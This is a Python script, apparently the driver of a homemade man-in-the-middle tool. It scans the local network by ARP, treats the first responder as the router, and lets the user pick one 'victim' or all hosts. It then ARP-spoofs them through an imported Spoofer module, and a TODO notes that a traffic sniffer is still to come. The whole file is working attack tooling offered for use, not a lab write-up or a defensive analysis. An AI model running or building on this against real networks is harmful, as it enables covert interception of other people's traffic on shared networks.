from network_scanner import NetworkScanner
from arp_spoofer import Spoofer
from sys import exit
from subprocess import call, check_output, CalledProcessError
from os import killpg, getpgid, setsid
from signal import SIGTERM
from re import search
from subprocess import Popen, PIPE
import asyncio


def get_my_ip(interface):
    ip_regex = r'inet \d+.\d+.\d+.\d+'
    try:
        ifconfig_result = str(check_output(['ifconfig', interface]))
    except CalledProcessError:
        print('[-] I couldn\'t get your IP. Check interface.')
        exit()
    ip = search(ip_regex, ifconfig_result).group(0)
    return ip[5:] # Cut "inet "


def scan_my_network(my_ip):
    network_scanner = NetworkScanner()
    full_wlan_ip_range = network_scanner.get_wlan_ip_from_ip(my_ip)
    print(f'[+] We will send ARP request to wlan ip :{full_wlan_ip_range}')
    answers = network_scanner.scan(full_wlan_ip_range) # We don't want router
    spoof_ip = answers[0][1].psrc
    answers = answers[2:]
    print('Here we go, list of avaible machines')
    network_scanner.print_result(answers)
    return answers, spoof_ip


def choose_victim_to_spoof(answers):
    picked_target = input(f'Which one to spoof 0 - {len(answers) - 1} ? (or use "all" for every): ')
    if picked_target == 'all':
        target_ip = [answer[1].psrc for answer in answers]
    else:
        target_ip = [answers[int(picked_target)][1].psrc]
    return target_ip


if __name__ == '__main__':
    interface = 'eth0'
    my_ip = get_my_ip(interface)
    print(f'[+] Got your ip: {my_ip}')
    answers, spoofed_ip = scan_my_network(my_ip)
    targets_ip = choose_victim_to_spoof(answers)
    print(f'[+] Spoofing {targets_ip}')
    Spoofer().spoof(targets_ip, spoofed_ip)
    # TODO: Implement sniffer
